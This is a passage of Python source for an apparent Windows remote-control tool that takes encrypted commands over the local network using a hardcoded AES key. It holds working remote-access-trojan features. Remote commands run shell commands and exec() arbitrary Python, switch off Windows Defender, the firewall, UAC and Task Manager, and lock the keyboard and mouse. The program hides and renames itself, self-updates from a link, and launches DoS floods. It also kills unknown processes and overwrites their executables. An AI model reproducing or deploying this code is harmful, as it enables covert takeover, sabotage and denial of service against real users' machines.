            pid_locations.append(psutil.Process(pid).exe())
        except Exception as e:
            #print(f'Error: {e}')
            continue
    # Kill all the processes in the list of processes to kill
    
    # filter tokill list from exclude_list_have
    
         
    
    #name_pid_list = [psutil.Process(pid).name() for pid in tokill]
    #print(name_pid_list)
    #sleep(4)    

    # print('initiating the to-kill in terminate unknown processes!')
    self = os.path.join(get_script_directory(), get_script_filename()).lower().replace('\\', '/')
    for pid in tokill:
        if pid == ownpid:
            continue
        if pid in lsttocheck:
            continue
        else:
            try:
                proc = psutil.Process(pid)
                if len(proc.cmdline()) > 1:
                    vrsproc = proc.cmdline()[1]
                else:
                    vrsproc = proc.cmdline()[0]
                
                # print(f'Name: {proc.name()}, equal to self {proc.name().casefold() == get_script_filename().casefold()}, location equal: {proc.name().casefold() == get_script_filename().casefold()}')
                if proc.name().casefold() == tmpnamefilenameself.casefold() and self.casefold() == vrsproc.lower().replace('\\', '/').casefold():
                    continue
                else:
                    # print(f'{psutil.Process(pid).name()} @ {psutil.Process(pid).exe()} is being killed, equal?', (name == tmpnamefilenameself.lower() and exe_path.lower().replace("\\", "/").replace("//", "/") == a1tmpnamedirectoryself.lower().replace("\\", "/").replace("//", "/")))
                    # slp(1)
                    # runcmd('taskkill /f /im ' + psutil.Process(pid).name())
                    psutil.Process(pid).kill()
            except Exception as e:
                #print(f'Error: {e}') 
                pass

    #print('\n\nAnd now to corrupt..\n')
    
    if corrupt:
        for location in pid_locations:
                try:
                        #print(location)
                        corruptfile(location) # corrupt it, cause why tf not?
                except Exception as e:
                        #print(f'Error: {e}')
                        pass




def handle_messages_varyhost(msg, addr, conn):
    global timeout_device_list, varyhosts
    unmodified_msg = msg
    ip, port = addr
    
    print("addr of handle_messages, ", addr)
    if msg == "SystemStartupIAmAVaryHost":
        # how addr looks like: str and int('192.168.1.79', 53140)
        # newaddr = (str(ip), int(vary_PORT))
        print(f'New address called!, adding {ip}:{vary_PORT} to the varyhosts list')
        varyhosts.append(f'{ip}:{vary_PORT}')
    if msg == "Keepalive":
        timeout_device_list[addr] = time.time() + 60*1 # this is where it resets.
    if msg == r'RequestToShareScreenDeviceSelf&!^(*^%&!@#(&^@!%$(!@#!!!!!)))':
        # You can either send a true or false, make a either true or false variable to indicate whether the program is currently doing something or not. / is in progress of something
        send((ip, vary_PORT), 'True')
        print('Request to share screen this device, accepted.')
        global running_ss, server
        running_ss = True
        host_ss((ip, int(vary_PORT)))
        print('Request to share screen this device has ended')
        # convert whatever this is to a sharescreen
    if "REQUESTSENDALLHOSTCONTINUEONMESSAGE" in msg and "XR~=3yy=[W2vc%L" in msg:
        id, ip, identifier, todo = msg.split('XR~=3yy=[W2vc%L')
        if identifier in done_vary_tasks:
            print("I've already done this todo, so ignoring it, " + todo)
            return # task is already done and listed
        else:
            done_vary_tasks.append(identifier)
        sendAllVaryHosts(unmodified_msg) # since it's already set, reset it
        # move on with the todo
        
        # with the original todo ip you can send back logs, ip etc's if for example a phone host is requesting something from all the machines they all can return to that ip and the server can finalize and return to phone.
        
        print(f"Got a todo from {ip}, it said to do: {todo} with an identifier of {identifier}")
        # TODO: now you do a handle phone type of thing with the attached ip and todo for it
        # like for emergencies or some trolls i guess this can be used, like open a website or something, since phones already can connect to all the devices this is pretty much  not needed, but still, local computers are more capable from any phone
        
        
    
    # whenever done, just paste these in to the waiters stuff.
    
def webhandler(website):
    runcmd(f'start chrome "{website}"')
    
def formatproperlyipv4(scrmbl):
    global prioritizeipv4
    scrmbl = scrmbl.replace(' ', '')
    scrmbl = scrmbl.split(',') if ',' in scrmbl else [scrmbl]
    scrmbl = list(set(scrmbl)) # to remove duplicates
    scrmbl = list(filter(None, scrmbl))
    prioritizeipv4 = scrmbl


def decrypt_msg(msg, key=b'\x12\x1f\xb7\x1b\x7f\xe8W0\xa7\xc7\x04\xad\xc5\x03Q\xa1\x93\xd7\xab3\xe9\xbfE\xcf)=w\xd1\x97N\x9e\xae'):
    '''You give it a msg, it'll encrypt it, thats if the message is from a valid vary device, otherwise, it'll error out and return false'''
    def encrypt(key, plaintext):
        try:
            cipher = AES.new(key, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
            return (cipher.nonce, tag, ciphertext)
        except Exception as e:
            print(f'Error when encrypting text: {e}')
    def decrypt(key, ciphertext):
        try:
            (nonce, tag, ciphertext) = ciphertext
            cipher = AES.new(key, AES.MODE_EAX, nonce)
            plaintext = cipher.decrypt(ciphertext)
            try:
                cipher.verify(tag)
                return plaintext#.decode("utf-8")
            except ValueError:
                return None
        except Exception as e:
            print(f'Error when decrypting text: {e}')
    TUTKEYPHONE = key
    try:

        msg = str(msg.decode('utf-8'))                    
        msg = ast.literal_eval(msg)
        #print(repr(msg))
        # Decrypt the message
        plaintext = decrypt(TUTKEYPHONE, msg)
        text = plaintext.decode("utf-8")
    except Exception as e:
        print(f'Error when decrypting text: {e}')
        return False

def encrypt_msg(msg, key=rb'\x12\x1f\xb7\x1b\x7f\xe8W0\xa7\xc7\x04\xad\xc5\x03Q\xa1\x93\xd7\xab3\xe9\xbfE\xcf)=w\xd1\x97N\x9e\xae'):
    '''You give it a msg, it'll encrypt it, thats if the message is from a valid vary device, otherwise, it'll error out and return false'''
    def encrypt(key, plaintext):
        try:
            cipher = AES.new(key, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
            return (cipher.nonce, tag, ciphertext)
        except Exception as e:
            print(f'Error when encrypting text: {e}')
    def decrypt(key, ciphertext):
        try:
            (nonce, tag, ciphertext) = ciphertext
            cipher = AES.new(key, AES.MODE_EAX, nonce)
            plaintext = cipher.decrypt(ciphertext)
            try:
                cipher.verify(tag)
                return plaintext#.decode("utf-8")
            except ValueError:
                return None
        except Exception as e:
            print(f'Error when decrypting text: {e}')
    TUTKEYPHONE = key
    try:
        message = (encrypt(TUTKEYPHONE, msg))
        message = str(message)
        message = message.encode('utf-8')
        message = bytes(message)
        return message
    except Exception as e:
        print(f'Error when encrypting text: {e}')
        return False

def handle_connection_of_connected_device(msg, addr, conn):
    # of phones that request to do xyz. e.g. open an address in browser
    
    # TODO: this.
    spltr = "OD2tIzZNuOHBqnu"
    task = 'undefined'
    information_msg = None
    if spltr in msg:
        tmpls = msg.split(spltr)
        tmpls += [None] * (4 - len(tmpls))
        tmpls = [None if i == "" else i for i in tmpls]
        print(tmpls)
        task = tmpls[0]
        information_msg = tmpls[1]
        handler = tmpls[2]
        if task is not None:
            task = task.lower()
        information_msg_beforelower = information_msg
        # if information_msg is not None:
            # information_msg = information_msg.lower()
        if handler is not None:
            handler = handler.lower()

        print(task, information_msg, handler)
    else: task = msg
    if task is not None:
        task = task.lower()
        
    global autoterminateunknownexeprocesses, prioritizeipv4
        # if task == 'searchforlocaldevicesport'  make the phones have the searches as they are definitely capable of/for such task
    # if task == 'addToSafeModeLocationFile'.lower() and information_msg !=None: # addToSafeModeLocationFile(information_msg) # i don't know about this.. like there are use cases but how many..
    if task == 'clearprioritize': prioritizeipv4 = None
    if task == 'ipv4prioritize' and information_msg != None: formatproperlyipv4(information_msg)
    if task == 'makethescreendorotations' and information_msg != None: makethescreendorotations(information_msg)
    if task == 'undefined': return False    
    if task == 'runcmd' and information_msg != None: runcmd(information_msg)
    if task == 'programvl2' and information_msg != None: programVL2(information_msg)
    if task == 'blackenscreen' and information_msg != None: blackenscreen(information_msg)
    if task == 'texttospeech' and information_msg !=None: texttospeech(information_msg_beforelower)
    if task == 'speakxlanguage' and information_msg !=None: speakXlanguage(information_msg_beforelower)
    if task == 'disableuseraccountcontrol': disableUserAccountControl()
    if task == 'enableuseraccountcontrol': enableUserAccountControl()
    if task == 'swappedswaprmbandlmb' and not task == 'unswappedswaprmbandlmb': swaprmbandlmbtrue()
    if task == 'unswappedswaprmbandlmb' and not task == 'swappedswaprmbandlmb': unswaprmbandlmb()
    if task == 'typestringwithhumandelay' and information_msg !=None: type_string_with_human_delay(information_msg)
    if task == 'sendallhostsatodo' and information_msg !=None: send_all_hosts_a_todo(information_msg, settingIP=addr) # to change after recoding this, also this is where the handler takes place, and is the ip:port(if you choose to make them have an open server) of the phone
    if task == 'addselftosafemode': addselftosafemode()
    if task == 'protectfileself': protectfileself()
    if task == 'disablewindowsdefender': DisableWindowsDefender()
    if task == 'enablewindowsdefender': EnableWindowsDefender()
    if task == 'disableresetoptions': disableresetoptions()
    if task == 'enableresetoptions': enableresetoptions()
    if task == 'handletostartsequences': handle_tostart_sequences()
    if task == 'terminateunknownprocesses': terminate_unknown_processes()
    if task == 'getscriptdirectory': get_script_directory() # make it print on the phone the directory using some sort of a function to send back to the phone
    if task == 'getscriptfilename': get_script_filename()
    if task == 'hideselfexecutable': hide_self_executable()
    if task == 'restartexplorer': restart_explorer()
    if task == 'killself': kill_self() # color this red/dull red on phone and add a confirmation to continue and prehaps a pass in order to continue
    if task == 'resetnetwork': reset_network()
    # if task == 'windowslagclicksound': toggle_win_click_exclamation() # is a toggle
    if task == 'diversifywindowslagclicksoundenable': enable_windows_lag_click_sound()
    if task == 'diversifywindowslagclicksounddisable': disable_windows_lag_click_sound()
    if task == 'prockill' and information_msg !=None: procKill(information_msg) # expects a name of a process e.g. chrome.exe
    if task == 'setvolume' and information_msg !=None: set_volume(information_msg)
    if task == 'updateselfvialink' and information_msg != None: updateselfViaLink(information_msg_beforelower)
    if task == 'renameself' and information_msg !=None: renameSELF(information_msg_beforelower)
    if task == 'hideprocessvianame' and information_msg !=None: hide_process_via_name(information_msg_beforelower)
    if task == 'showprocessvianame' and information_msg !=None: show_process_via_name(information_msg_beforelower)
    if task == 'freezeallprocesses': freeze_all_processes()
    if task == 'unfreezeallprocesses': unfreeze_all_processes() # the reason it's not a toggle is since it's frozen you don't have a direct identifier of whether or not it's taking place or not
    if task == 'restartself': restart_self()
    if task == 'movetofolder' and information_msg != None: moveToFolder(information_msg_beforelower) # use random since specifying on phone is annoying
    if task == 'offsmartassnointernet': toggleSmartAssNoInternet(Set=False)
    if task == 'onsmartassnointernet': toggleSmartAssNoInternet(Set=True)
    if task == 'dosipport' and information_msg != None: dosIPPORT(information_msg)
    if task == 'closedosipport': closedosingthreads()
    if task == 'disableuwf': disableUWF()
    if task == 'enableuwf': enableUWF()
    if task == 'inviscurr' and information_msg: inviscurr(information_msg) # the duration of how long to have the trigger in the works
    if task == 'webhandler': webhandler(information_msg_beforelower)
    if task == 'playtone' and information_msg != None: play_tone_fxphone(information_msg)
    if task == 'playshepardtone' and information_msg != None and "thmAaBAOPlurh5w".lower() in information_msg: a = information_msg.split('thmAaBAOPlurh5w'.lower()); play_shepard_tone(int(a[0]), int(a[1]), int(a[2]))
    if task =='runpythonscript' and information_msg !=None: runpythonscript(information_msg_beforelower)
    if task == 'disablefirewall': disablefirewall()
    if task == 'enablefirewall': enablefirewall()
    if task == 'restarttoadvancedoptions': restartToADvancedOptions()
    if task == 'disabletaskmgr': disableTaskmanager()
    if task == 'enabletaskmgr': enabletaskmgr()
    if task == 'enablemouse': enable_mouse()
    if task == 'disablemouse': disable_mouse()
    if task == 'enablekeyboard': enable_keyboard()
    if task == 'disablekeyboard': disable_keyboard()
    if task == 'presskeys' and information_msg !=None: presskeys(information_msg)
    if task == 'writetext' and information_msg !=None: writetext(information_msg)
    if task == 'meandtheboys': MeAndTheBoys()
    if task == 'restarttouac': restartToUAC()
    if task == 'installchrome': installchrome()
    if task == 'disableterminateunknownprocesses': autoterminateunknownexeprocesses = False
    if task == 'enableterminateunknownprocesses': autoterminateunknownexeprocesses = True
    if task == 'runfunctionviastring' and information_msg != None:
        if "split".lower() in information_msg.lower():
            locals()[information_msg_beforelower.split('split')[1].split("=")[0]] = information_msg_beforelower.split('split')[1].split("=")[1]
            print('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',information_msg_beforelower.split('split')[0], information_msg_beforelower.split('split')[1])
            # Split the information_msg_beforelower and extract the function name and arguments
            function_name, *arguments = information_msg_beforelower.split('split')

            # Initialize an empty dictionary to store the arguments
            kwargs = {}

            # Parse the arguments and add them to the kwargs dictionary
            for arg in arguments:
                arg_name, arg_value = arg.split("=")
                kwargs[arg_name.strip()] = arg_value.strip()

            # Call runfunctionvianame with the function name and parsed arguments
            runfunctionvianame(function_name, **kwargs)
        
        else:
            runfunctionvianame(information_msg_beforelower); print("aaaaaaaaaaaaaaaa", information_msg_beforelower)
    if task == 'unblock_application_by_name' and information_msg != None: unblock_application_by_name(information_msg_beforelower)
    if task == 'block_application_by_name' and information_msg != None: block_application_by_name(information_msg_beforelower)
    if task == 'unblock_ports_for_application' and information_msg != None: unblock_ports_for_application(information_msg_beforelower)
    if task == 'block_ports_for_application' and information_msg != None: block_ports_for_application(information_msg_beforelower)
    if task == 'resetfirewall': reset_firewall()
    if task == 'self_destruct': self_destruct()
    if task == 'playytvidbetweentime': playYTvidinbackground(information_msg_beforelower.split("splitterofty1243")[0], information_msg_beforelower.split("splitterofty1243")[1], information_msg_beforelower.split("splitterofty1243")[2])
    # in the app side, if theses are unspecified, set them to none
    



    

def handle_connection(conn, addr):
    global device_item_received
    def encrypt(key, plaintext):
        try:
            cipher = AES.new(key, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
            return (cipher.nonce, tag, ciphertext)
        except Exception as e:
            print(f'Error when encrypting text: {e}')
    def decrypt(key, ciphertext):
        try:
            (nonce, tag, ciphertext) = ciphertext
            cipher = AES.new(key, AES.MODE_EAX, nonce)
            plaintext = cipher.decrypt(ciphertext)
            try:
                cipher.verify(tag)
                return plaintext#.decode("utf-8")
            except ValueError:
                return None
        except Exception as e:
            print(f'Error when decrypting text: {e}')
    TUTKEYPHONE = b'\x12\x1f\xb7\x1b\x7f\xe8W0\xa7\xc7\x04\xad\xc5\x03Q\xa1\x93\xd7\xab3\xe9\xbfE\xcf)=w\xd1\x97N\x9e\xae'
    # try:
    
    msg_length = conn.recv(HEADER).decode('utf-8') 
    #print(f'msg length : {msg_length}')
    if msg_length:
            msg_length = int(msg_length)
            msg = conn.recv(msg_length)
            msg = str(msg.decode('utf-8'))                    
            msg = ast.literal_eval(msg)
            #print(repr(msg))
            # Decrypt the message
            plaintext = decrypt(TUTKEYPHONE, msg)
            text = plaintext.decode("utf-8")
            # Print the decrypted message
            #print("Decrypted message:", text)
            msg = text
            print("Encrypted message(now decrypted):", msg)
            conn.close()
            conn.detach()
            
            # note in address isn't a vary port! it's some random one to send the message
            ip_ofcn, port_ofcn = addr
            isconnVaryHost = False
            for i in varyhosts:
                ip123, port123 = i.split(":")
                if ip123 == ip_ofcn:
                    isconnVaryHost = True
                    break
            if msg.lower() == 'SystemStartupIAmAVaryHost'.lower():
                isconnVaryHost = True # startup item
                print(f'Added {addr} to varyhosts')
            if isconnVaryHost == True:
                print(f'Treating {addr} as a vary host')
                new_addr = (str(ip_ofcn), int(vary_PORT)) 
                device_item_received[new_addr] = msg                    
                handle_messages_varyhost(msg, new_addr, conn)
                return # to prevent accidental double or unintentional to other devices inputs
            else:
                device_item_received[addr] = msg
                
            # a check for if it's a safe device, as in a phone, so that you can control it. and add a toggle/trigger so if a phone has requested the request to spread throughout all devices.
            # while what you can do is nothing, if it has the encryption key and it works, great, it's probably a safe device.
            android_phone_confirmation = True
            global prioritizeipv4
            print(f'prioritizeipv4: {prioritizeipv4}')
            if prioritizeipv4 != None:
                print(repr(prioritizeipv4))
                try:
                    ip_of_client = addr[0]
                    if ip_of_client in prioritizeipv4:
                        pass
                    else:
                        return # since it returns there is no need in limiting the handleconnection thing in the else here, as if it does in fact error out, it won't accept nothing which isn't ideal
                except Exception as e:
                    print(f'Error in prioritizeipv4 handling of receive todo phones: {e}')
            
            if android_phone_confirmation:
                handle_connection_of_connected_device(msg, addr, conn)
            
            
    # except Exception as e:
        # print("error message receive function :", e)




# host handler

def serverhost():
    try:
        server.listen()
        print(f"[LISTENING] Server is listening on {SERVER}:{vary_PORT}")
        while True:
            conn, addr = server.accept() # in these, if the server receives a message that is "SystemStartup", it'll register it as a new vary device(that specific ip) also, send back a confirmation
            connected_devices.append(conn)
            thread = threading.Thread(target=handle_connection, args=(conn, addr))
            thread.start()
            # print(f"[ACTIVE CONNECTIONS] {len(1)}")
    except Exception as e:
        # texttospeech(f'Error: {e}')
        print(f'Error in serverhost function: {e}')
        slp(3)
        return serverhost()
    



def get_script_directory():
    if getattr(sys, 'frozen', False):
        # If the script is running as a bundled executable (e.g., PyInstaller)
        # print('Running as a bundled executable(pyinstaller)')
        return os.path.dirname(sys.executable)
    else:
        # If the script is running as a regular Python script
        return os.path.dirname(os.path.abspath(__file__))

def get_script_filename():
    if getattr(sys, 'frozen', False):
        # If the script is running as a bundled executable (e.g., PyInstaller)
        # print('Running as a bundled executable(pyinstaller)')
        return os.path.basename(sys.executable)
    else:
        # If the script is running as a regular Python script
        return os.path.basename(__file__)

# make it so that if the below errors out, it'll scan for the device that is using that port, if it is the same as the current file(filename), and is 
# running in the same directory, it'll kill itself and let the other process continue
# SERVER = socket.gethostbyname(socket.gethostname()) # you know what you can do, if this errors, as only one usage each socket address, just scan the local device for devices using this, kill them(and child processes) & corrupt. 
# ADDR = (SERVER, PORT)
# server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# server.bind(ADDR)

def get_process_connected_pids(pid):
    # Get the process with the given PID
    proc = psutil.Process(pid)
    
    # Get the parent process of the process
    parent = proc.parent()
    
    # Get the PID of the parent process
    if parent is not None:
        ppid = parent.pid
    else:
        ppid = None
    
    # Get a list of child processes of the process
    children = proc.children()
    
    # Get a list of PIDs of the child processes
    child_pids = [child.pid for child in children]
    
    # Create a list to store all the PIDs
    all_pids = []
    
    # Add the PID of the process to the list
    all_pids.append(pid)
    
    # Add the PPID of the process to the list (if it exists)
    if ppid is not None:
        all_pids.append(ppid)
    
    # Add the child PIDs of the process to the list
    all_pids.extend(child_pids)
    
    # Return the list of all PIDs
    return all_pids

def hide_self_executable():
    """
    When ran, it'll take the programs own pid and use it to 
    Hide the UI of the program from the user
    """
    [hide_process_via_pid(i) for i in get_process_connected_pids(os.getpid())]
    # not as good as i'd like, i'd also want it to be capable of hiding the window of the terminal for example if executed from there, ./appname.py in cmd

def restart_explorer():
    runcmd("taskkill /f /im explorer.exe") # don't use /t, it kills everything including the dvrfy program
    runcmd("explorer.exe", retry=4)

def get_username_os():
    return os.getlogin()


def get_random_folder():
    
    if admin_privileges:
        folders = [ # for the love of god no spaces PLESASE
                "C:\ProgramData",
                "C:\Windows",
                "C:\Windows\System32"]
    else:
        username = get_username_os()
        folders = [f"C:\\Users\\{username}\\AppData\\Local",
                f"C:\\Users\\{username}\\AppData\\LocalLow",
                f"C:\\Users\\{username}\\AppData\\Roaming",
                f"C:\\Users\\{username}\\Documents",
        ]
    
    all_folders = []
    for i in folders:
        [all_folders.append(os.path.join(i, x)) for x in os.listdir(i)] # if there are no folders throughout all of them.. that's a different thing
    # print(all_folders)

    # Filter out the files and only keep the directories
    all_actual_folders = [i for i in all_folders if os.path.isdir(i) and " " not in i]
    chosen = random.choice(all_actual_folders)
    return chosen


def kill_self():
    [runcmd(f'taskkill /f /t /PID {i}') for i in get_process_connected_pids(os.getppid())]
    runcmd(f'taskkill /f /t /PID {os.getpid()}')



def reset_network():
    runcmd('ipconfig /release')
    runcmd('ipconfig /renew')
    runcmd('ipconfig /flushdns')
    runcmd('netsh winsock reset')
    runcmd('netsh int ip reset')
    runcmd('netsh advfirewall reset')
    runcmd('netsh firewall reset')
    runcmd('netsh int tcp set heuristics disabled')
    runcmd('netsh int tcp set global autotuninglevel=normal')
    runcmd('netsh int tcp set global rss=enabled')
    runcmd('netsh int tcp show global')
    # disablefirewall() # now using firewall to block ports and etc

def disablefirewall():
    runcmd('netsh advfirewall set allprofiles state off', True)
    runcmd('netsh firewall set notifications mode=disable profile=all', True)
    
def bypassfirewall():
    exe_path = os.path.join(get_script_directory(), get_script_filename())

    # The netsh command to add a new rule allowing traffic through the firewall
    cmd = f'netsh advfirewall firewall add rule name="x32dbg" dir=in action=allow program="{exe_path}" enable=yes'
    programVL2(cmd)
    restart_self()



def enablefirewall():
    runcmd('netsh advfirewall set allprofiles state on', True)


def restartToADvancedOptions():
    programVL2('shutdown.exe /r /o /f /t 0')

def disableTaskmanager():
    programVL2('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')

def enabletaskmgr():
    programVL2('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f')

def runpythonscript(text):
    try:
        exec(text)
        print('Succesfully ran code')
    except Exception as e:
        print(f'Error while running python code:\n{e}')
        return e


   


def check_and_kill_self(SERVER1, port_to):
    '''
    BIG note!
    If the process(es) to check is not in LISTENING mode
    then it won't be able to determine it, meaning,
    it'll cause it to not be able to be found, and also
    not being able to find it
    
    
    * changed from checking a port, to just checking if a
    script is running where it's location and name is
    equal to the current process and if not it'll terminate
    it, and if there is no available port, it'll terminate
    all the unknown apps.
    
    *PS 4.2.24, i get why you changed it, cause is not in listening you cannot find which whose using the port so you kill all unknown, and then if fails, restart.
    I'll create a, "who_is_using_port()" function, and it'll return both the location and pid of the process using the port
    
    *Also made it do the kill all processes and if issue
    presists it'll restart if the bind/listen still is
    caught by a different process. 
    '''
   
    self = os.path.join(get_script_directory(), get_script_filename()).lower().replace('\\', '/') # use lower case ALWAYS, THESE CHECKS CAN MESS UP!
    print(self + ' <- self variable')
    print('requested port to check: ' + str(port_to))
    def corruptfile(directoryoffile):
        with open(directoryoffile, "w+") as f:
            f.seek(0)
            content = f.read()
            scrubbed_content = b"X" * len(content)
            f.seek(0)
            f.write(scrubbed_content)
            f.truncate()
            
    try:
        ADDR = (SERVER1, port_to)
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(ADDR)        
        server.listen()
        server.close()
        server.detach()
        return "rn"
    except Exception as e:
        print(f'Error: {e}')
        pids_tocheck_ofself = get_process_connected_pids(get_own_parent_process_pid())
        # print(e)
        for proc in psutil.process_iter():
            try:
                if proc.pid in pids_tocheck_ofself:
                    continue
                # if proc.cmdline() == []:
                    # continue
                # print(proc.cmdline())
                # print(proc.name())
                if len(proc.cmdline()) > 1:
                    vrsproc = proc.cmdline()[1]
                else:
                    vrsproc = proc.cmdline()[0]
                
                print(f'Name: {proc.name()}, equal to self {proc.name().casefold() == get_script_filename().casefold()}, location equal: {proc.name().casefold() == get_script_filename().casefold()}')
                if proc.name().casefold() == get_script_filename().casefold() and self.casefold() == vrsproc.lower().replace('\\', '/').casefold():
                    return 'ks'
                elif proc.name().casefold() == get_script_filename().casefold():
                    [i.kill() for i in proc.children()]
                    proc.kill()
                    slp(0.4)
                    runcmd(f'taskkill /f /t /PID {proc.ppid}')
                    corruptfile(vrsproc.lower())
            except Exception as e:
                # print(f'Error trying to select process, cisir(acronym): {e}')
                pass
        try:
            slp(3)
            ADDR = (SERVER1, port_to)
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind(ADDR)
            server.listen()
            server.close()
            server.detach()
            return "rn"
        except Exception as e:
            print(f'Error1: {e}')
            terminate_unknown_processes()
            try:
                slp(6)
                ADDR = (SERVER1, port_to)
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.bind(ADDR)
                server.listen()
                server.close()
                server.detach()
                return "rn"
            except Exception as e:
                print(f'Error2: {e}')
                # reset the socket maybe something is off there, then restart to take effect
                reset_network()
                runcmd('shutdown.exe /g /t 0')
                
               
# def autokillunknownprocesses():
#     global autoterminateunknownexeprocesses

#     while True:
#         # print('auto termination run')
#         if autoterminateunknownexeprocesses == False:
#             slp(8)
#             continue
#         else:
#             print('terminating unknown processes')
#             terminate_unknown_processes(corrupt=False) # cause.. like it's funny if they try to run and it is justcorrupted every other time; Well no cause it can cause problems and be annoying, user initiated will coruupt this not 
#             slp(8)
            
            


def autokillunknownprocesses():
    global autoterminateunknownexeprocesses
    if autoterminateunknownexeprocesses:
        print('terminating unknown processes')
        terminate_unknown_processes(corrupt=False)
    # Reschedule the timer to run again after 8 seconds
    threading.Timer(8.0, autokillunknownprocesses).start()

def autofreezeunknownprocesses_func():
    global autofreezeunknownprocesses
    if autofreezeunknownprocesses:
        print('freezing unknown processes')
        freeze_unknown_processes()
    # Reschedule the timer to run again after 8 seconds
    threading.Timer(8.0, autofreezeunknownprocesses_func).start()

# Create and start the timers for the first time
timer1_forautokill = threading.Timer(8.0, autokillunknownprocesses)  # Initial delay of 8 seconds
timer2_forautofreeze = threading.Timer(8.0, autofreezeunknownprocesses_func)  # Initial delay of 8 seconds
timer1_forautokill.start()
timer2_forautofreeze.start()



def runcode(code):
    try:
        exec(code)
    except Exception as e:
        print(f'Error: {e}')


# SERVER = socket.gethostbyname(socket.gethostname())
# PORT = 12345



    # while True:
    #     print("Running!")
    #     sleep(3)
    
# scan for local vary devices

    
def onStartup():
    global server

    print("onStartup")
    # now scan locally for vary devices
    thread_handle_serverhost = threading.Thread(target=serverhost)
    thread_handle_serverhost.start()
   
    def scan_forvary():
        varyhosts.clear()
        [varyhosts.append(i) for i in search_for_local_devices_port(vary_PORT)] # is as IP:PORT pair, this is list of these
    scan_forvary()
    # every ten or more minutes it'll run the search again, and add devices that are not in the list
    for i in varyhosts:
        if ":" in i:
            tlp, port = i.split(':')
        send(f'{tlp}:{port}', "SystemStartupIAmAVaryHost") # you do not add the device here, you add it in the host, where it confirms that the device is actually active.
        
    # thread_handle_keepalive = threading.Thread(target=keepalive)
    # thread_handle_keepalive.start()
    # you know how you have the internet check? so also make a check if it is connected to a wifi thing; connected to something at all and isn't disconnected, b\c there can be no internet but also no connection at all, casuing other problems such as finding the subnet and all those.
    inputisallowed = False # if using windowed(no console is shown) you cannot have inputs, as it has no interface to interact with, it crashes
    while inputisallowed:
        while True:
            what = str(input("What to send?: "))
            print('Sending to: ', varyhosts)
            socket.setdefaulttimeout(2)
            if what.split(' ')[0] == 'remoteSTART':
                remote_share(what.split(' ')[1]) # what is the neccesity of the port? it HAS to be a varydevice and they all already use the same port
            if what.split(' ')[0] == 'satd':
                print('Alright, send to all vary hosts a todo, ' + what.split(" ")[1])
                send_all_hosts_a_todo(what.split(' ')[1])
            if what.lower() == 'rescan':
                scan_forvary()
            sendAllVaryHosts(what)

def wait_on_receive(host, port):
    global device_item_received
    if (host, int(port)) in device_item_received.keys():
        pass
    else:
        device_item_received[(host, int(port))] = ''
    current_item = device_item_received[(host, int(port))]
    # perhaps integrated a timeout
    while device_item_received[(host, int(port))] is current_item:
        pass
        # print("Waiting for a message to be received" + device_item_received[(host, int(port))])
    return device_item_received[(host, int(port))]


def remote_share(host):
    port = vary_PORT
    send(f'{host}:{port}', "RequestToShareScreenDeviceSelf&!^(*^%&!@#(&^@!%$(!@#!!!!!)))")
    okay_to_continue = wait_on_receive(host, port)
    if okay_to_continue.lower() == 'True'.lower() or okay_to_continue == True:
        print('host/user accepted screen share')
    else:
        print('host/user rejected screen share')
        return
    global tlss

    client_ss(host)
    print('SS finished, moving on')
    
    # okay wait a moment, shouldn't the other device make a request,
    # okay so, this, whenever is ran, it'll ask the other device to share IT'S SCREEN to whoever called this, and then all the heavy math and all the headache goes. jesus chirst. send help, this is gonna be LONGGGGG
    # also, whenever the other device returns true, it'll wait until/convert its connection to the live stream of the monitor/display and allow keys/mouse movement to be
    pass
 




# MessageBox = ctypes.windll.user32.MessageBoxW
# MessageBox(None, "An error has occurred", "Error", 0x40 | 0x1)


# def windows_lag_click_sound():
#     # how to initalize and stop, note everything should be on a global!.
#     # Set the initial value of run_win_click_exclamation to True
#     # run_win_click_exclamation = True

#     # # Create a thread for the windows_lag_click_sound function
#     # clicks_thread = threading.Thread(target=windows_lag_click_sound)

#     # # Start the thread
#     # clicks_thread.start()

#     # # Wait for 5 seconds
#     # time.sleep(5)

#     # # Set run_win_click_exclamation to False to stop the function from running
#     # run_win_click_exclamation = False

#     # # Wait for the thread to finish
#     # clicks_thread.join()

#     # # Set the clicks_thread variable to None
#     # clicks_thread = None
#     # global run_win_click_exclamation
#     # run_win_click_exclamation = True # this can be a toggle if you wish, just make it global, a while loop, true will ause it to run, anything else will cause it to stop
    
#     def win_on_click_play_sound(x, y, button, pressed):
#         if pressed and button in (button.left, button.right, button.middle):
#             winsound.PlaySound("SystemExclamation", winsound.SND_ALIAS)

#     with pynput.mouse.Listener(on_click=win_on_click_play_sound) as listener:
#         while True:
#             pass

# winlag_thread_toggle = KThread(target=windows_lag_click_sound, args=())

# def diversify_win_click_exclamation(set):
#     """it may take 4+ seconds to undo the lag"""
#     global winlag_thread_toggle
#     print(winlag_thread_toggle.is_alive())
    
#     if set == True or set == "True" or set == "true":
#         if not winlag_thread_toggle.is_alive():
#             winlag_thread_toggle.start()
#     else:
#         if winlag_thread_toggle.is_alive():
#             winlag_thread_toggle.kill()
#             winlag_thread_toggle = KThread(target=windows_lag_click_sound, args=())
            
    
def win_on_click_play_sound(x, y, button, pressed, stop_event):
    if stop_event.is_set():
        return False  # Stop the listener
    if pressed and button in (pynput.mouse.Button.left, pynput.mouse.Button.right, pynput.mouse.Button.middle):
        winsound.PlaySound("SystemExclamation", winsound.SND_ALIAS)

def windows_lag_click_sound(stop_event):
    print("enabling the weird event thingj  where there air there are plenty of people tgat ")
    with pynput.mouse.Listener(on_click=lambda x, y, button, pressed: win_on_click_play_sound(x, y, button, pressed, stop_event)) as listener:
        listener.join()

# Create a stop event
stop_event_windowslag = threading.Event()
stop_event_windowslag.set() 

def enable_windows_lag_click_sound():
    global winlag_thread
    if not stop_event_windowslag.is_set():  # Check if already running
        print('is already running apparently')
        return
